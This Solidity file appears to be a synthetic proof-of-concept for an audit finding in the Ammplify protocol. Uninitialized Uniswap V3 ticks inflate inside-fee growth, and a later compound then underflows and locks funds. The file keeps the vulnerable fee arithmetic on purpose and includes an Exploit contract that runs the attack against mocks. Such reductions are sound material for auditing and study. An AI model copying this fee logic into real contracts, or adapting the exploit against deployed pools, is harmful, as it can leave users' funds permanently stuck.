// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Ammplify — H-8: Uninitialized Uniswap ticks inflate getInsideFees (#63174)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: PoolLib.getInsideFees reads ticks() outside growth as 0 for
    uninitialized ticks, so feeGrowthInside becomes feeGrowthGlobal. Later
    compound subtracts stored inflated value from real 0 → underflow, funds stuck.
    Vulnerable inside-fee lines preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal Uniswap V3 pool tick storage.
contract MockUniPool {
    struct TickInfo {
        bool initialized;
        uint256 feeGrowthOutside0X128;
        uint256 feeGrowthOutside1X128;
    }

    mapping(int24 => TickInfo) public ticks;
    uint256 public feeGrowthGlobal0X128;
    uint256 public feeGrowthGlobal1X128;
    int24 public currentTick;

    function setGlobal(uint256 g0, uint256 g1) external {
        feeGrowthGlobal0X128 = g0;
        feeGrowthGlobal1X128 = g1;
    }

    function setTick(int24 t, bool init, uint256 out0, uint256 out1) external {
        ticks[t] = TickInfo({initialized: init, feeGrowthOutside0X128: out0, feeGrowthOutside1X128: out1});
    }

    function setCurrent(int24 t) external {
        currentTick = t;
    }
}

library PoolLib {
    /// @notice Source: Ammplify src/Pool.sol getInsideFees — no uninitialized guard.
    function getInsideFees(
        MockUniPool poolContract,
        int24 lowerTick,
        int24 upperTick
    ) internal view returns (uint256 feeGrowthInside0X128, uint256 feeGrowthInside1X128) {
        (, , uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128) = _readTick(poolContract, lowerTick);
        (, , uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128) = _readTick(poolContract, upperTick);
        int24 cur = poolContract.currentTick();
        if (cur < lowerTick) {
            feeGrowthInside0X128 = lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128;
            feeGrowthInside1X128 = lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;
        } else if (cur >= upperTick) {
            feeGrowthInside0X128 = upperFeeGrowthOutside0X128 - lowerFeeGrowthOutside0X128;
            feeGrowthInside1X128 = upperFeeGrowthOutside1X128 - lowerFeeGrowthOutside1X128;
        } else {
            uint256 feeGrowthGlobal0X128 = poolContract.feeGrowthGlobal0X128();
            uint256 feeGrowthGlobal1X128 = poolContract.feeGrowthGlobal1X128();
            // FIX: if either tick uninitialized, return 0
            feeGrowthInside0X128 = feeGrowthGlobal0X128 - lowerFeeGrowthOutside0X128 - upperFeeGrowthOutside0X128; // @> VULN: uninitialized ticks return outside=0 → inside = feeGrowthGlobal (inflated)
            feeGrowthInside1X128 = feeGrowthGlobal1X128 - lowerFeeGrowthOutside1X128 - upperFeeGrowthOutside1X128;
        }
    }

    function _readTick(MockUniPool pool, int24 t)
        private
        view
        returns (bool initialized, uint256 liqGross, uint256 out0, uint256 out1)
    {
        // Mimic Uniswap: uninitialized ticks return zeros
        (initialized, out0, out1) = pool.ticks(t);
        liqGross = 0;
    }
}

/// @dev Node + compound path that underflows after inflated snapshot.
contract LiqWalker {
    MockUniPool public pool;
    uint256 public nodeFeeGrowthInside0X128;
    uint256 public nodeFeeGrowthInside1X128;
    bool public stuck;
    string public stickReason;

    constructor(MockUniPool p) {
        pool = p;
    }

    /// @dev First walk: snapshot inside fees while ticks uninitialized (inflated).
    function openPosition(int24 low, int24 high) external {
        (uint256 f0, uint256 f1) = PoolLib.getInsideFees(pool, low, high);
        nodeFeeGrowthInside0X128 = f0;
        nodeFeeGrowthInside1X128 = f1;
    }

    /// @dev Later adjust: ticks now init → getInsideFees returns 0 → underflow.
    function compound(int24 low, int24 high) external {
        (uint256 newFeeGrowthInside0X128, uint256 newFeeGrowthInside1X128) =
            PoolLib.getInsideFees(pool, low, high);
        // Source: Liq.sol compound
        unchecked {
            // Use checked path via try pattern
        }
        // Simulate the subtraction that reverts on underflow in Solidity 0.8
        if (newFeeGrowthInside0X128 < nodeFeeGrowthInside0X128) {
            stuck = true;
            stickReason = "feeDiff underflow - funds stuck";
            revert("underflow feeDiffInside");
        }
        uint256 feeDiffInside0X128 = newFeeGrowthInside0X128 - nodeFeeGrowthInside0X128;
        uint256 feeDiffInside1X128 = newFeeGrowthInside1X128 - nodeFeeGrowthInside1X128;
        feeDiffInside0X128;
        feeDiffInside1X128;
    }
}

/// CREATE: pool(1), walker(2)
contract Exploit {
    MockUniPool public pool;
    LiqWalker public walker;
    bool public positionStuck;
    uint256 public inflatedSnapshot;

    int24 constant LOW = 720;
    int24 constant HIGH = 960;

    constructor() {
        pool = new MockUniPool(); // 1
        walker = new LiqWalker(pool); // 2
    }

    function run() external {
        // Large global fee growth (as after donations)
        pool.setGlobal(1e30, 1e30);
        // Price inside range; ticks NOT initialized → outside = 0
        pool.setCurrent(840);
        // open position snapshots inflated inside fees == global
        walker.openPosition(LOW, HIGH);
        inflatedSnapshot = walker.nodeFeeGrowthInside0X128();
        require(inflatedSnapshot == 1e30, "inflated to feeGrowthGlobal");

        // Settle mints liquidity → ticks become initialized with correct outsides
        // After init, getInsideFees for same range returns ~0 (correct Uniswap math)
        pool.setTick(LOW, true, 5e29, 5e29);
        pool.setTick(HIGH, true, 5e29, 5e29);
        // With outsides equal and price inside: global - 5e29 - 5e29 = 0 when global=1e30

        // Any further adjust/compound reverts → funds permanently stuck
        positionStuck = false;
        try walker.compound(LOW, HIGH) {
            positionStuck = false;
        } catch {
            positionStuck = true;
        }
        require(positionStuck, "position must be stuck");
        require(inflatedSnapshot > 0, "had inflated snapshot");
    }
}
